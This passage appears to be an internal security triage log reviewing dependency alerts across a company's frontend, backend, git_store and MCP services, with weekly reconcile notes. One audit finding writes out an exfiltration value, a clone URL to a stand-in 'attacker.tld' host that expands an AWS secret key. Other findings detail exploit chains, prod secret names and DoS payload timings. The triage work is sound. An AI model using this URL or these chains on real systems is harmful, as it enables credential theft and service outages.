#776 (renderer) — all triaged non-material, and zero alerts closed (the most recent remediation of any kind remains July 28, 2026). All five load-bearing invariants behind existing NO verdicts were re-verified and hold; see the August 17 reconcile in the summary. August 10, 2026: 18 new high alerts — GitPython's \"3.1.58 wave\" (11 alerts across back_end + git_store), cryptography ×2, black, ip-address, fast-uri, js-yaml, brace-expansion — all triaged non-material (see rows + the August 10 reconcile in the summary). Prior weeks: Pillow #704 and the back_end leg of GitPython #725 were remediated July 28, 2026. The git_store leg GitPython #724 is still open but non-material — git_store was never bumped (still 3.1.45), but every path into it is gated behind the LaunchDarkly flag git-store-microservice, which is never enabled, and get_feature_flag defaults to False. git_store is effectively an unused service; its alerts are non-material for as long as that flag stays off. The earlier material findings (SAML-ACS DoS #660/#662) remain remediated (June 26, 2026). See summary at the bottom. Everything else is dev/build tooling, unreachable code paths, or requires preconditions our code verifiably doesn't have.\n## Frontend — axios (23 open alerts, 15 distinct advisories)\nContext: the frontend is a browser SPA. Its direct dependency is axios 0.21.1 (March 2021); axios 1.x copies come transitively via aws-amplify and vite-plugin-mkcert (dev). Verified code facts: axios is called in 14 files with fixed endpoints (config.apiGateway.URL + hardcoded paths) and JWT headers from makeHeaders(); no axios.create, interceptors, baseURL, xsrfCookieName, or untrusted config objects anywhere.\nAction: upgrade the direct axios dependency from 0.21.1 to ≥1.16.0 (our usage is plain axios.get/post(url, data, {headers}) — modest migration) and bump aws-amplify; this clears all 29 alerts.\n## Frontend — other runtime npm packages\nContext: routing is React Router Data Mode, client-only (createBrowserRouter with one catch-all route; zero loaders/actions/SSR — verified). Charts: vega-lite specs arrive from the backend/LLM (vega_config in questionApi.ts) and are compiled and embedded verbatim in QuestionResultChartVega.tsx.\n## Frontend — dev tooling\n## Renderer service (headless-Chrome screenshot Lambda)\nContext: the renderer navigates only to hardcoded Zenlytic URLs, loads config from our own S3 bucket, and writes output back to S3. No proxies, no FTP, no untrusted tar extraction, no websocket server (verified in services/renderer/index.js).\n## Backend (main FastAPI service) — Python\n## Git store & Lambda services — Python\nContext: git_store is internal-only (reachable only from the backend at git-store.<env>.internal:8000, api/services/git_store/client.py:41-43; no nginx/public route; no auth of its own) — but as of September 8, 2026 it is no longer flag-gated dead code: the new /api/v2/workspaces/{id}/vcs/* router (#8897, 76c5cf7dab) drives it on every request with only data_model_edit, so attacker-controlled input (workspace.github_url, branch names, refs, file paths/contents) now reaches git_store through back_end's trusted client on ungated routes. \"Internal-only\" therefore no longer carries any of these verdicts on its own; each row must stand on its code-level reasoning (re-verified Sept 8 — see the #724 row and the Sept 8 reconcile). Verdict basis as of September 8, 2026 (product confirmation): git_store is not used anywhere in production, so its alerts stay non-material; that deployment fact — not the flag gate — is now the control for this whole cluster. Re-check this section before any production use of git_store or the /vcs routes. The Lambda is a cron app that only calls our own internal API.\n## MCP server — Apps UI (services/mcp_server/ui, npm)\nContext (new scan surface — first alerts Sept 8, 2026): services/mcp_server is the standalone Python Starlette + mcp==2.1.0 MCP server (app.py; middleware.py bearer-PAT auth) that lets Claude.ai / ChatGPT query Zoe. It is internet-reachable (prod mcp.zenlytic.com via scripts/build_images_github_actions.sh; dev EKS via .github/workflows/deploy-dev-eks.yml; GCP in-VPC mcp-invpcdev.zenlytic.com). ui/ is not a server or SPA — it is a build-time-only Vite 8 + vite-plugin-singlefile project (package.json: \"Build-time only… only dist/ is read by the Python server\") that bundles src/view-result.js into one HTML file; the Dockerfile ui-builder stage runs npm ci && npm run build and copies only ui/generated/ into the Python image (no node_modules at runtime), and ui_apps.py:73 serves it as the ui://zenlytic/view-result.html MCP Apps widget that renders query results inside the host's sandboxed iframe. Added with the MCP Apps work Aug/Sept 2026 (#8803, #8806, #8812, #8866). Per the Aug 31 note: dompurify/marked output ships into the served page and should be triaged as potentially material to the widget; everything else in this lockfile is build-time.\n## Summary — High severity\n150 open alerts across 48 package/manifest clusters (122 distinct advisories). 0 materially exploitable findings. GitPython #724 (git_store, env-var exfiltration via the customer-settable clone URL) was provisionally flipped to YES on September 8, 2026 after #8897 made git_store reachable on ungated back_end routes, then reverted to NO the same day on product confirmation that git_store is not used anywhere in production; see the September 8 reconcile at the bottom. (Previously:) the sqlparse findings (#780/#781) were remediated August 25, 2026 and back_end's GitPython \"3.1.58 wave\" closed August 27, 2026; see the August 31, 2026 reconcile below. (Historical, retained as audit trail:) the two findings open in mid-June — python-multipart #660 and starlette #662 (unauthenticated DoS via the public SAML ACS endpoint) — were remediated on June 26, 2026 (commit efb43ffda4: back_end bumped to python-multipart 0.0.30 + starlette 1.3.1 + fastapi 0.133.1). The original triage detail is retained below as the audit trail (both now resolved):\n- python-multipart quadratic urlencoded DoS (#660) — the public/unauthenticated SAML ACS endpoint (saml_providers/routes.py, Auth(public=True)) parses application/x-www-form-urlencoded via Form(); a tiny ;-separated body triggers O(n²) CPU → unauthenticated worker-exhaustion DoS. Fix: bump python-multipart to ≥0.0.30.\n- starlette request.form() limit-bypass DoS (#662) — same public SAML ACS endpoint; request.form() ignores field/size limits for urlencoded bodies, so an oversized body blocks the event loop / exhausts memory. Fix: bump starlette to ≥1.3.1 (needs a fastapi bump).\nMaterial findings remediated in earlier reconciles: vega-functions #373 (vega 6 upgrade), pillow #418/#561/#530 (12.2.0), storybook #441 (≥8.6.17), python-multipart #602 (≥0.0.27), python-multipart #660 + starlette #662 (back_end fastapi/starlette/multipart bump, June 26, 2026).\nJune 24, 2026 reconcile: no new critical/high alerts opened and none closed since June 16. Open set unchanged (5 critical / 107 high). The two material SAML-ACS DoS findings (#660, #662) remain open — re-verified the public saml_acs() Form() code path and the still-vulnerable installed versions (python-multipart 0.0.27 < 0.0.30, starlette 0.49.1 < 1.3.1). Note: the esbuild #653 row (GHSA-gv7w-rqvm-qjhr) references an alert that does not exist in the repo (API 404; no such advisory alert) — it was added in error and is not a tracked vulnerability.\nEverything else is non-material: Node-adapter/proxy code that never runs in a browser SPA (all axios), SSR/Framework-mode features we don't use (react-router), dev/build/test tooling on trusted input (minimatch, picomatch, eslint/storybook/vite chains, black, wheel, setuptools), unreachable APIs (GitPython config_writer, lodash _.template, glob CLI, DTLS, SECT curves, ecdsa signing), orphaned lockfile entries that aren't even installed (fast-uri, serialize-javascript), trusted-source-only inputs (renderer tar/FTP/ws, urllib3 to AWS, pyarrow streams), or already-patched versions with stale alerts (lxml). Recommended hygiene sweep: bump axios to ≥1.16, react-router-dom to ≥7.15, aws-amplify, GitPython to ≥3.1.50, orjson, urllib3, storybook, vite; remove dead deps (terser@3.14.1, react-cookie-consent, customize-cra chain); regenerate the frontend lockfile to drop orphaned webpack-era entries.\nJune 29, 2026 reconcile: Open set is now 5 critical / 104 high (down from 5 / 107 on June 24). The two material findings that were open last week — python-multipart #660 and starlette #662 (unauthenticated DoS via the public SAML ACS endpoint) — were remediated June 26, 2026 via commit efb43ffda4 (\"bump fastapi, starlette and python-multipart for critical vuln remediation\"); back_end poetry.lock now pins python-multipart 0.0.30, starlette 1.3.1, fastapi 0.133.1 (verified). The non-material starlette StaticFiles-UNC alert #656 closed in the same bump. No new critical or high alerts opened this week, and there are now 0 materially-exploitable open findings across both severities. git_store still runs the older vulnerable versions (python-multipart 0.0.17, starlette 0.46.2 → alerts #681/#683/#677/#601/#411/#407/#409 remain open) but it is internal-only (no public route), so those stay non-material. The esbuild #653 row remains a phantom (no such alert in the repo; tracked in error).\nJuly 6, 2026 reconcile: Open set unchanged since June 29 — 5 critical / 104 high, 0 materially exploitable. No new critical or high alerts opened and none closed this week. No dependency manifest/lockfile changed on dev since June 29, so all installed-version facts in the rows above still hold; re-verified back_end pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1 (the June 26 material-fix commit efb43ffda4). Spot-checked the week's code diff for verdict-relevant drift: git_store untouched; renderer change only makes its S3 bucket name env-configurable (still our own bucket); no new Form()/multipart endpoints, no new axios config patterns (create/interceptors/baseURL), no react-router loaders/actions/redirect(), no _.template usage introduced. Bookkeeping note: the axios rows above cite five package.json-manifest duplicate alerts (#652, #651, #645, #643, #641) that GitHub actually auto-closed June 10–12, 2026 — they are duplicates of still-open yarn.lock alerts for the same advisories, so the 24 remaining open axios alerts and the row verdicts are unaffected. The recommended hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, lockfile regeneration) remains the fastest way to burn down the non-material backlog.\"\nJuly 13, 2026 reconcile: Open set is 5 critical / 103 high, 0 materially exploitable. No new critical or high alerts opened, and no alerts actually closed — the API shows zero fixed/dismissed/auto-dismissed high alerts since June 29. The count change (104 → 103) is a bookkeeping correction only: axios dup alert #628, cited in the axios Node-adapter row, does not exist in the repo in any state (API 404 — a phantom reference like esbuild #653), so last week's 104 overcounted by one; the true open axios count is 23 alerts and no row verdicts change. No dependency manifest/lockfile changed on dev since July 6, so all installed-version facts above still hold (back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1; git_store still on its older internal-only versions). Spot-checked the week's code diff for verdict-relevant drift: no new Form()/multipart/request.form() endpoints, no GitPython config_writer/multi_options usage, no new axios config patterns (create/interceptors/baseURL/xsrfCookieName), no react-router loaders/actions/redirect(), no _.template, no window.vega/VEGA_DEBUG. The recommended hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding and is still the fastest way to burn down the non-material backlog.\nJuly 20, 2026 reconcile: Open set is 5 critical / 105 high, 0 materially exploitable. Two new high alerts opened this week, both frontend and both triaged non-material (rows added above): js-yaml #691 (quadratic merge-key DoS — direct runtime dep whose load() only ever parses the workspace's own data-model YAML; client-side availability-only) and brace-expansion #690 (exponential-expansion DoS — vulnerable 2.0.1 copy lives only under lint/build toolchains). No alerts closed or dismissed. No dependency lockfile changed on dev; re-verified back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1, and git_store its older internal-only versions (python-multipart 0.0.17, starlette 0.46.2, GitPython 3.1.45). Verdict-relevant drift: the MCP-server work (commit 71333df7f4) added a new public/unauthenticated POST /oauth/token endpoint with Form(...) params in back_end (api/v2/oauth/routes.py) — a new unauthenticated form-parsing surface, but the patched python-multipart/starlette pins already cover it, so no new material finding; git_store and renderer had zero commits; no new axios config patterns, react-router loaders/actions/redirect(), _.template, or window.vega/VEGA_DEBUG in the frontend diff; the public SAML ACS endpoint is unchanged. Scope note: 71333df7f4 also added a new manifest services/mcp_server/pyproject.toml (mcp[cli], httpx, no lockfile) — future sweeps must include this new service. Quick win: the one-line yarn upgrade js-yaml@^4.3.0 closes #691; the broader hygiene sweep (axios ≥1.16, react-router-dom ≥7.15, aws-amplify, GitPython ≥3.1.50, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding.\nJuly 27, 2026 reconcile: Open set is 5 critical / 142 high, 2 materially exploitable — the first non-zero material count since the SAML-ACS findings were remediated June 26, 2026. 37 new high alerts opened this week (a large Pillow + GitPython advisory wave); none closed or dismissed. No dependency lockfile changed on dev since July 20, so all prior installed-version facts still hold (back_end still pins python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1; git_store still on its older internal-only versions).\nTwo new material findings (both remediation-worthy):\n- Pillow #704 (CVE-2026-59204, JPEG2000 tiled-decode DoS) — reachable via the same unrestricted Image.open(io.BytesIO(...)) on user-uploaded chat images (conversation_processor.py:831, no formats= restriction) that made #418/#530 material; a JP2 renamed .png passes the extension gate and forces a full decode server-side. Availability-only, authenticated. Fix: bump Pillow 12.2.0 → 12.3.0 (clears all 10 new Pillow alerts #694–#705).\n- GitPython #725 (back_end) + #724 (git_store) (GHSA-rwj8-pgh3-r573, env-var exfiltration) — Repo.clone_from() runs os.path.expandvars() on the clone URL, and customer-settable workspace.github_url reaches it unvalidated both in-process in back_end (metrics_layer/.../github_repo.py:212,222) and via git_store (main.py:1202,1211). A workspace admin (edit_settings) can set github_url = https://attacker.tld/$AWS_SECRET_ACCESS_KEY.git to leak backend/git-store process-env secrets (AWS creds, DB URL, encryption/LLM keys) to an attacker host — customer tenant → Zenlytic infra. Fix: bump both poetry.locks to ≥3.1.52 (≥3.1.55 clears the whole 9-alert GitPython wave); harden by validating github_url on write in ModifyWorkspaces.patch (workspace.py:1097-1103).\nStructural note: back_end is no longer GitPython-free — it clones customer repos in-process via the vendored metrics_layer GithubRepo, so back_end GitPython alerts (#716/720/723/725/727-731) can no longer be dismissed as dev/unused. This is a new manifest cluster.\nThe other 35 new alerts are non-material: the remaining 9 Pillow advisories (RankFilter/paste/crop/ImageCms/font/GD/McIdas/PDF decoders never reached on the backend path); the 8 other GitPython advisories in the wave (clone options hardcoded, refs git-validated, config_writer/create_remote unreached — thinnest margins are #728 diff --output and #730 single-char-kwarg smuggling); pyasn1 #707/#708 (transitive DoS, no untrusted ASN.1 decode); sharp #722 (only inside the network-blocked Modal code-interpreter microVM that already runs arbitrary LLM code unprivileged); react-router #735 (Framework/SSR-mode-only per the advisory; we run Data Mode client-only); postcss #732/#736 (dev/build tooling on repo-authored CSS); brace-expansion #692/#737 and fast-uri #714/#726 (folded into existing rows — lint/build toolchains, and an orphaned uninstalled lockfile entry, respectively). Both new material code paths were re-verified to exist as described.\nFastest burndown: Pillow → 12.3.0 and GitPython → ≥3.1.55 in both back_end and git_store poetry.locks resolve both material findings plus 17 non-material alerts in two lockfile bumps; the standing hygiene sweep (axios ≥1.16, react-router-dom ≥7.18, aws-amplify, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration) remains outstanding.\nAugust 3, 2026 reconcile: Open set is 5 critical / 122 high, 0 materially exploitable. 21 alerts closed this week (all fixed 2026-07-28, via the metrics_layer bump commit 4545520925, which regenerated services/back_end/poetry.lock): the full 10-alert Pillow wave (#694, #695, #696, #697, #698, #700, #702, #703, #704, #705 — Pillow 12.2.0 → 12.3.0), the 9-alert back_end GitPython wave (#716, #720, #723, #725, #727, #728, #729, #730, #731 — 3.1.50 → 3.1.57), and pyasn1 #707/#708 (0.6.3 → 0.6.4). 3 new high alerts opened, all brace-expansion in the frontend and all non-material (folded into the existing row): #743 and #744 (GHSA-mh99-v99m-4gvg, patched 2.1.3 / 1.1.17) and #745 (GHSA-rgw5-rvv9-x895, patched 2.1.4). Note #744 puts the 1.1.11 copy in range for the first time, invalidating last week's \"1.x not in the vulnerable range\" claim — re-traced and still non-material (sole consumer is minimatch@3.1.2 under eslint devDeps; zero src/ imports; repo-authored glob patterns only).\nGitPython #724 (git_store) — open, but NOT material. It was initially assessed as material during this run and downgraded after product confirmation, corroborated in code, that git_store is an unused service. back_end went to 3.1.57 while services/git_store/poetry.lock still pins 3.1.45, and in code back_end does forward the unvalidated customer-settable workspace.github_url into git_store's clone endpoint — but that path is dead at runtime. Every entry point into GitStoreDataModelEditorUtils (the class holding all four ensure_repo_cloned_to_git_store call sites) is gated by use_git_store = is_self_service and get_feature_flag({\"workspace_id\": …}, \"git-store-microservice\") (data_model_editor.py:218-223, 525-533, 682-689, 726-733; identical gate at project_manager.py:430-433); the flag is never enabled, get_feature_flag defaults to False (api/definitions/feature_flags.py:161-190), and no FF_GIT_STORE_MICROSERVICE env override exists in the repo. The use_git_store_flag DB column defaults to true but is never read by any gating logic. For the audit trail, the code-level chain that would fire if the flag were enabled: ModifyWorkspaces.patch (api/blueprints/workspace.py:1034-1037, permission edit_settings, still only a 3-key denylist and no URL validation) → Workspace.modify blanket-setattr (api/models/workspace_models.py:478-487) → ensure_repo_cloned_to_git_store (api/data_model/data_warehouse.py:1077) → client.clone_repo → POST /workspaces/{id}/repos/clone (api/services/git_store/client.py:591-594) → git_store/main.py:1143 (CloneRequest.url is a bare str, no validator) → Repo.clone_from at main.py:1202/:1211 → git/cmd.py:917 os.path.expandvars(url). Verified empirically in the running containers: zenlytic-git-store-1 expands $FAKE_SECRET into the clone URL; zenlytic-back_end-1 (3.1.57) does not.\nIf the flag is ever switched on, this becomes material immediately — and with a large blast radius. git_store calls set_env_vars(os.getenv(\"APP_ENV\")) at import (git_store/main.py:14 → env.py:65, WithDecryption=True), and its ECS task definitions (zenlytic-git-store-{prod,stage,dev}-app-task) set APP_ENV without KUBERNETES_BUILD — so the process environment holds the entire decrypted /prod/ SSM tree, 118 parameters, including ANTHROPIC_API_KEY, OPENAI_API_KEY, DATABASE_URL, SECRET_KEY, STRIPE_SECRET_KEY, AUTH0_CLIENT_SECRET, GITHUB_APP_PEM, MODAL_TOKEN_SECRET, SLACK_SIGNING_SECRET, LANGFUSE_SECRET_KEY, SF_PASSWORD, PAT_JWT_PRIVATE_KEY, and CLOUDFRONT_PRIVATE_KEY. Every name matches [A-Z_]+, so all are valid $VAR expansion tokens; egress is unrestricted (prod SG sg-0a6abd6ae830ae6fa, -1 to 0.0.0.0/0), and clone_repo returns git's stderr to the caller (main.py:1237-1241) as a second echo channel. Internal-only network position does not mitigate: the attacker never contacts git_store directly — a workspace admin's github_url is carried there by back_end's own trusted client call. Fix (lock-only): regenerate services/git_store/poetry.lock to GitPython ≥3.1.52; pyproject.toml's ^3.1.40 already permits it, and ≥3.1.55 additionally clears git_store alerts #719, #721, #738-#742. Then validate github_url scheme/host on write, and set KUBERNETES_BUILD=true plus an explicit secrets: block on the git-store task defs so the service stops inheriting all 118 prod secrets.\nBookkeeping correction: last week's reconcile marked the entire git_store GitPython cluster remediated on July 29, 2026 — rows #607/#603, #600, #556/#554, and #725/#724. That was wrong: only the back_end alerts were fixed, and every git_store GitPython alert (#554, #556, #600, #603, #607, #719, #721, #724, #738-#742) is still open, confirmed via the API and by git show origin/dev:services/git_store/poetry.lock (still 3.1.45). Those rows have been reverted to Remediated = No with the correction noted inline; their non-material verdicts were independently re-verified against 3.1.45 and all still hold (config_writer/set_value zero call sites; create_head inputs git-validated or route-constrained; clone_from options hardcoded; archive() treeish validated against repo.branches; create_remote has no invoking call path).\nVerdict-relevant drift check (51 commits on dev since July 27): only two manifests changed — services/back_end/poetry.lock (the remediation above) and the code-interpreter scripts/package.json (esbuild → ^0.28.0; sharp unchanged at ^0.33.0, so #722 stays open and non-material). git_store, renderer, lambda, and the frontend lockfile were untouched, so all other installed-version facts still hold. The one new Form(...) parameter (api/v2/oauth/routes.py:125, public oauth_callback) is on the MCP OAuth surface already flagged July 20; back_end's patched python-multipart 0.0.30 / starlette 1.3.1 / fastapi 0.133.1 pins cover it, so it creates no new material finding. No new axios config patterns (create/interceptors/baseURL/xsrfCookieName), no react-router loaders/actions/redirect(), no _.template, no window.vega/VEGA_DEBUG, no new GitPython config_writer/multi_options usage.\nAugust 10, 2026 reconcile: Open set is now 5 critical / 138 high (from 5 / ~122 on Aug 3): 18 new high alerts opened — all triaged non-material — and the following closed. Closed: axios #651/#652 (+ dups #643/#645, fixed upstream), black #461 (superseded by re-raised #747), fast-uri #604/#605 (advisories withdrawn by GitHub). New (all NO): GitPython \"3.1.58 wave\" — back_end 3.1.57 (#765/#766/#768/#769/#770) + git_store 3.1.45 (#754/#759/#760/#762/#763/#764) — option-forwarding/guard-bypass advisories whose sinks are verifiably never invoked (no IndexFile tree ops, Repo.init takes zero kwargs, no forwarded **kwargs, no config_writer, no submodule ops on the customer repos we clone); cryptography #748 (PKCS#7 decrypt API never called) and #749 (closest call — exponential X.509 path-building reachable from the public SAML ACS but blocked by the always-pinned x509_cert= kwarg; keep that invariant reviewable); black #747 (dev-group only, never imported at runtime); ip-address #746 (renderer; SOCKS/PAC-proxy dead code path); fast-uri #753 (same orphaned lockfile entry — dismiss with #714/#726); js-yaml #771 (tenant-authored YAML only; yarn upgrade js-yaml@^4.3.1 clears #691+#771); brace-expansion #751 (1.x leg of the dev-toolchain advisory). Corrected en route: the js-yaml #691 rationale — the runtime load() path does ship in the browser bundle; the mitigating factor is the privileged-author actor, not an unreachable path. Re-verified: git_store poetry.lock still pins GitPython 3.1.45; the lock-only bump target moves to ≥3.1.58, which now closes all 19 git_store GitPython alerts; back_end additionally needs 3.1.57→3.1.58 for its five. New hardening note from this week's trace: git_store/main.py:467/:493 pass branch names positionally to git ls-remote/reset, where GitPython's kwarg guard doesn't look — admin-configured input today, but a -- separator or leading-dash rejection would be cheap insurance. Also noticed: back_end's nested metrics_layer/poetry.lock resolves gitpython 3.1.54, but back_end's own lock (3.1.57) governs the built image — clean up to avoid confusing future alerts.\nAugust 17, 2026 reconcile: Open set is 5 critical / 143 high (from 5 / 138 on Aug 10) → 112 distinct advisories across 45 package/manifest clusters, 0 materially exploitable. Zero alerts closed this week — the most recent fixed_at across every fixed high/critical alert is still July 28, 2026 (the metrics_layer bump 4545520925), and there are no dismissed or auto-dismissed alerts at all. No dependency manifest or lockfile changed on dev across the 23 commits since Aug 10, so every installed-version fact in the rows above still holds. 5 new high alerts, all non-material (rows added/updated above): fast-uri #774/#775, nanoid #773/#777 (new package cluster — Vite/PostCSS build chain, nanoid(6) literal size, vulnerable custom-generator API never called), and extract-zip #776 (renderer — reachable only from @puppeteer/browsers install(), which puppeteer-core never imports; no upstream patch exists).\nCorrection carried forward — the fast-uri dismissal rationale was wrong. #774/#775 carry the same CVEs (CVE-2026-6322/-6321) that withdrawn alerts #604/#605 carried, but GitHub re-issued corrected advisories under new GHSA ids (GHSA-v39h-62p7-jpjc, GHSA-q3j6-qgpj-74h6) and both are active — withdrawn_at: null, confirmed via the advisories API. The whole fast-uri cluster (#714/#726/#753/#774/#775) must therefore be dismissed as vulnerable code is not actually used — independently re-verified this week — rather than as withdrawn duplicates, which would now read as a bad dismissal on audit. Durable fix: delete the dead webpack / babel-loader resolutions pins at services/front_end/package.json:10-11 and re-run yarn install, which drops the webpack → schema-utils@4 → ajv@8 → fast-uri chain out of the lockfile entirely. This is the fourth consecutive week an uninstalled package has generated HIGH noise.\nAll five load-bearing invariants re-verified and holding. (1) cryptography #749 — the SAML ACS still pins the customer IdP cert (api/services/sso/saml/response.py:62-66 and :87-91), supplied at saml_providers/service.py:283-287, enforced at provider creation (:125-132), column still non-nullable (saml_models.py:19); signxml/XMLVerifier has exactly one import site repo-wide and zero unpinned verify( call sites, and there are zero hits for cert_resolver=, PolicyBuilder, ServerVerifier, or load_pem_x509_certificates across back_end / git_store / mcp_server. (2) GitPython #770/#764 — zero hits for .submodules, Submodule., .gitmodules, or --recurse-submodules across back_end (incl. the vendored metrics_layer) and git_store; the only recursive=True uses are filesystem glob() calls. (3) Option-forwarding family — clone_from still hardcodes multi_options=[\"--no-single-branch\"] (git_store/main.py:1202-1207, :1211-1215), Repo.init(repo_path) still passes zero kwargs (:914), archive() treeish still validated against repo.branches (:1692-1695), create_remote (:2158) and its back_end client wrapper (api/services/git_store/client.py:971) still have zero invoking call sites, and config_writer/set_value still have zero call sites in either service. (4) The git-store LaunchDarkly gate still guards all five GitStoreDataModelEditorUtils call sites, and get_feature_flag still hard-returns False when both LaunchDarkly and the env map miss (api/definitions/feature_flags.py:195-224). Strengthened this week: the env-override leg is not merely unset but structurally unable to express this flag — _get_env_flag_value (:179-192) resolves a flag key to an env var only through ENV_VAR_TO_FEATURE_FLAG_MAP (:29-42) and returns None for anything absent from it, and that map has no git-store entry. So enabling git_store via environment variable requires a code change, not just an env var — a materially stronger gate than \"no FF_GIT_STORE_MICROSERVICE is currently set.\" Note feature_flags.py was rewritten this week (#8689, removing the ARTIFACTS flag and its helpers), which shifted line numbers throughout; the get_feature_flag resolution order and default are unchanged. (5) Pillow is still pinned 12.3.0 and no new unrestricted decode path appeared.\nPath corrections (bookkeeping only, no verdict change): the git-store gate lives in api/blueprints/data_model_editor.py:218-223, 524-531, 682-686, 727-731 — not api/data_model/data_model_editor.py, which does not exist; the Pillow upload decode moved to api/services/context/processor/llm/conversation_processor.py:831 (still no formats= restriction, coincidentally still line 831); and the two metrics_layer clone sites (core/parse/github_repo.py:212, 222) pass no multi_options at all, which is stricter than previously recorded. Also surfaced: one pre-existing ungated GitStoreClient use at api/blueprints/health.py:84-98 (a PublicResource at route /git_store) — it only calls health_check(), which returns a static dict on git_store (main.py:837-846) and touches no GitPython or repo code, so the flag-gate verdict is unaffected.\nDrift check (23 commits, 163 files, +5250/−962): no new Form() / UploadFile / request.form() surfaces — the new api/v2/workspaces/invites/ routes are both Auth(...)-gated — and the public SAML ACS endpoint is unchanged and still covered by the patched python-multipart 0.0.30 / starlette 1.3.1 pins. No new axios config patterns (create/interceptors/baseURL/xsrfCookieName); src/utils/router.tsx is untouched and still one catch-all client-only Data Mode route with no loaders/actions/redirect(); no _.template, no window.vega/VEGA_DEBUG, no new js-yaml load() sites, no StaticFiles mounts (repo-wide count is zero), no new image-decode or archive-extraction paths, and no proxy configuration in the renderer. Scope gap unchanged: services/mcp_server was touched by 4 commits but its pyproject.toml still has no lockfile, so its floating deps (mcp[cli], httpx, cryptography>=46.0.7) remain outside Dependabot's scan surface — worth fixing so the service enters triage at all.\nStanding caveat on the git_store cluster: all 13 open git_store GitPython alerts (#554, #556, #600, #603, #607, #719, #721, #724, #738-#742), plus its starlette/python-multipart/orjson/urllib3 alerts, are non-material because the service is unused, not because the code is safe. This whole cluster's verdicts flip the day git-store-microservice is enabled for any self-service workspace. Re-check this doc before that rollout.\nStale alerts worth manually dismissing: fast-uri #714/#726/#753/#774/#775 (#604/#605 were withdrawn by GitHub, then re-issued Aug 17, 2026 as #774/#775 under new, active GHSA ids — so dismiss the cluster as vulnerable code is not actually used, not as withdrawn duplicates) and serialize-javascript #453 are orphaned yarn.lock entries — confirmed not present in node_modules at all (removed webpack-era toolchain), so they can never be exploited and will not auto-close until the lockfile is regenerated. Also note three phantom alert numbers cited in rows above that do not exist in the repo in any state (API 404): esbuild #653, axios #628, and brace-expansion #737 — tracked in error, not real vulnerabilities, and excluded from all counts.\nFastest burndown: with 0 material findings there is no urgent action. The largest single count reduction is still the git_store poetry.lock GitPython bump to ≥3.1.58 (19 alerts in one lock-only change) — now a hygiene/pre-emptive item rather than a fix, and the natural prerequisite if git-store-microservice is ever scheduled to go live. A cheaper alternative worth considering: if git_store is genuinely dead, retiring the service and its manifest would remove all 13 alerts permanently instead of resetting the treadmill. Also newly actionable this week: extract-zip #776 has no upstream patch at all, so it can only be dismissed (vulnerable code not used) or removed via a disproportionate puppeteer-core 22→25 bump — dismissal is the right call. Otherwise: yarn upgrade brace-expansion (closes #690/#692/#743/#744/#745/#751), yarn upgrade js-yaml@^4.3.1 (closes #691/#771), a resolutions pin of nanoid: ^3.3.18 plus yarn install (closes #773/#777 in a 4-line lockfile diff; note plain yarn upgrade nanoid is a no-op for a transitive-only package), dropping the dead webpack/babel-loader resolutions at package.json:10-11 to permanently kill the recurring fast-uri cluster, and the standing hygiene sweep (axios ≥1.16, react-router-dom ≥7.18, aws-amplify, git_store fastapi/starlette/multipart parity bump, dead-dep removal, frontend lockfile regeneration to drop the orphaned entries).\nAugust 24, 2026 reconcile: Open set is 5 critical / 146 high (from 5 / 143 on Aug 17) → 115 distinct advisories across 46 package/manifest clusters, 2 materially exploitable (sqlparse #780/#781) — the first non-zero material count since June 26, 2026. Zero alerts closed this week — the most recent fixed_at across every fixed high/critical alert is still July 28, 2026 (the metrics_layer bump 4545520925), and there are still no dismissed or auto-dismissed alerts at all. That is now four consecutive weeks with no closures while 8 new alerts opened, so the backlog is growing purely by accretion; the recommended dismissals below are the only way several of these ever clear.\n3 new high alerts, all sqlparse in back_end, all non-material (new cluster; row added to the Backend table): #779 (CVE-2026-71491 / GHSA-f2ff-p2ww-7p4p, O(n²) group_comments — and it runs before the MAX_GROUPING_TOKENS guard, so sqlparse's own DoS caps don't mitigate it), #780 (CVE-2026-54284 / GHSA-pwgv-4x5q-6m9f, TokenList.__init__ O(n·depth) flattening — reaching the depth cap is itself superlinear; ~10 s CPU from a 2 KB payload), #781 (CVE-2026-59893 / GHSA-prg7-hcfm-mfcr, dollar-quote-lexer ReDoS; CVSS 3.1 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H). All three are patched in 0.6.0. Installed 0.5.5 (services/back_end/poetry.lock:7592-7594), transitive via the vendored metrics-layer (metrics_layer/pyproject.toml:16), not a direct back_end dep, and absent from every other service manifest.\nWhy #780/#781 are material. ⚠️ This paragraph replaces an initial non-material verdict that rested on an inverted reading of the code, caught on adversarial review and corrected after re-verification; recording the error explicitly because the mistake is an instructive one. The original claim was that the only request-path sqlparse call is api/sql_tools/query_runner.py:208, gated on Trino/Athena. In fact that branch is the narrow fallback. The main sink is query_runner.py:203, which passes pretty=True for every query type not in {TRINO, ATHENA}, and MetricsLayerConnection.get_sql_query (metrics_layer/core/query/query.py:164-165) then calls self.pretty_sql(query) → query.py:252-253 → sqlparse.format(...). So sqlparse formats effectively every Explore question and dashboard tile on Snowflake, BigQuery, Redshift, Postgres and Databricks. The lesson for future triage: ruling out a wrapper (ProjectManager.pretty_sql, which genuinely has zero callers) is not the same as ruling out the sink; two same-named methods sat one hop apart and only one was dead.\nThe input channel is dynamic fields, not typed SQL. The original triage was right that raw user/agent SQL is sqlglot-only — but a second channel bypasses that entirely: POST /workspaces/<id>/questions (api/blueprints/questions.py:95-106, permission view_content, the lowest authenticated role) reads dynamic_columns[].dynamic_field from request JSON (question_manager.py:47-58), and it is appended into the in-memory project with no SQL validation and no length cap (project_manager.py:1542-1546 → metrics_layer/core/model/project.py:151-163). The field's sql reaches the compiled query essentially verbatim — _replace_sql_query (field.py:3130-3175) does only ${...} substitution and a whitespace-collapsing re.sub, and for a dimension default_wrapping_func (field.py:634-654) returns it unchanged, its lone sqlglot.parse_one being reserved for windowed measures (and swallowing failures anyway). Measured on installed 0.5.5 in zenlytic-back_end-1 against a realistically shaped compiled query: nested parens 401 B → 79 ms, 801 